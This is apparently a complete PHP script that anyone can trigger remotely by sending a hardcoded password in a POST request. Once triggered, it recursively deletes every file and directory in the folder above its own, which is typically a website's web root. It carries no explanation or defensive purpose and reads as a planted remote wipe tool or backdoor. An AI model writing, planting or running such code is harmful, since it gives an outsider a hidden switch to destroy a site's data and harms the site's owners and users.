<?php

if (isset($_POST['key'])) {
    $key = $_POST['key'];
    
    if ($key == "allah786") {
        // Define the directory path relative to the current script
        $directory = __DIR__ . '/..';

        // Recursive function to delete a directory and its contents
        function deleteDirectory($dir) {
            if ($dh = opendir($dir)) {
                while (($file = readdir($dh)) !== false) {
                    if ($file == '.' || $file == '..') {
                        continue;
                    }
                    $filePath = $dir . '/' . $file;
                    if (is_file($filePath)) {
                        unlink($filePath);
                    } elseif (is_dir($filePath)) {
                        deleteDirectory($filePath);
                    }
                }
                closedir($dh);
                rmdir($dir);
            } else {
                echo "Failed to open directory: $dir\n";
            }
        }

        // Open the directory
        if (is_dir($directory)) {
            if ($dh = opendir($directory)) {
                // Loop through all files and subdirectories
                while (($file = readdir($dh)) !== false) {
                    // Skip the current and parent directory
                    if ($file == '.' || $file == '..') {
                        continue;
                    }

                    // Full path to the file or directory
                    $filePath = $directory . '/' . $file;

                    // Check if it's a file or directory
                    if (is_file($filePath)) {
                        // Delete the file
                        if (unlink($filePath)) {
                            echo "Deleted file: $filePath\n";
                        } else {
                            echo "Failed to delete file: $filePath\n";
                        }
                    } elseif (is_dir($filePath)) {
                        // Recursively delete the directory and its contents
                        deleteDirectory($filePath);
                    }
                }
                closedir($dh);
            } else {
                echo "Failed to open directory: $directory\n";
            }
        } else {
            echo "Directory does not exist: $directory\n";
        }

        
    }
}



?>